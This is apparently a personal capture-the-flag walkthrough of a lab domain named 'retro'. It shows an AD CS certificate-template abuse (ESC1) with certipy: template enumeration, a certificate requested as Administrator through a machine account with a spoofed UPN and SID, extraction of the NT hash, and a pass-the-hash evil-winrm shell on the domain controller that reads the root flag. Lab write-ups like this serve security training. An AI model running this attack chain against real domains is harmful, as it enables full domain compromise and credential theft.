ADCS1 

#Enumerating Certificate Templates
Identifying vulneravle certificate templates
certipy-ad find -u 'trainee@retro.vl0' -p password -dc-ip 10.129.234.44 -vulnerable -enabled 

#request a certificate as Administrator
certipy-ad req -u 'trainee@retro.vl0' -p 'trainee' -dc-ip 10.129.234.44 -ca retro-DC-CA -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl0'
                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ impacket-lookupsid 'retro.vl/BANKING$:password@10.129.234.44'          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.234.44
[*] StringBinding ncacn_np:10.129.234.44[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)


                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ ls                            
administrator_administrator.pfx
                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ mv administrator_administrator.pfx admin.pfx

                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ certipy-ad req   -u 'BANKING$@retro.vl'  -p 'password'  -dc-ip 10.129.234.44   -target 'DC.retro.vl'  -template 'RetroClients' -ca 'retro-DC-CA'   -upn 'administrator@retro.vl'   -dns 'administrator.retro.vl'   -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500           

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with multiple identifications
    UPN: 'administrator@retro.vl'
    DNS Host Name: 'administrator.retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saved certificate and private key to 'administrator_administrator.pfx'
                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ ls
admin.pfx  administrator_administrator.pfx
                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ certipy-ad auth -pfx administrator_administrator.pfx -dc-ip 10.129.234.44
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@retro.vl'
    [1] DNS Host Name: 'administrator.retro.vl'
> 0
[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
                                                                                                         
┌──(alvan㉿vbox)-[~/Downloads/certs]
└─$ evil-winrm -i DC.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                           
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                             
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/8/2025   8:11 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
40fce9c3f0902......
![Uploading image.png…]()
